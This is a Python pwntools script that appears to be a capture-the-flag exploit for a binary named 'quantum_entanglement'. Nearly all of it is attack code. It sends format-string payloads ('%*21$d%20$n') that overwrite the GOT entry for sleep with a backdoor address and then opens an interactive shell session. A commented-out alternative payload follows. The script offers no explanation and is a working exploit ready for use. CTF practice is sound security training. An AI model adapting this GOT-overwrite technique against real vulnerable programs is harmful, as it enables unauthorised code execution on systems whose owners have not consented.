#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process('./quantum_entanglement')
	elf = ELF('./quantum_entanglement')
else:
	p = remote()
	elf = ELF('./quantum_entanglement')


#gdb.attach(p,'b *fprintf')

sleep_got = elf.got['sleep']
backdoor = 0x080489DB

payload = p32(sleep_got) + p32(backdoor)
ru('FirstName:')
sl(payload)

ru('LastName:')
payload = '%*21$d%20$n'
sl(payload)

#gdb.attach(p)

ia()



'''
ru('FirstName:')
payload = '%*19$d%69$hn'
sl(payload)

ru('LastName:')
payload = '%*18$d%118$n'
sl(payload)
'''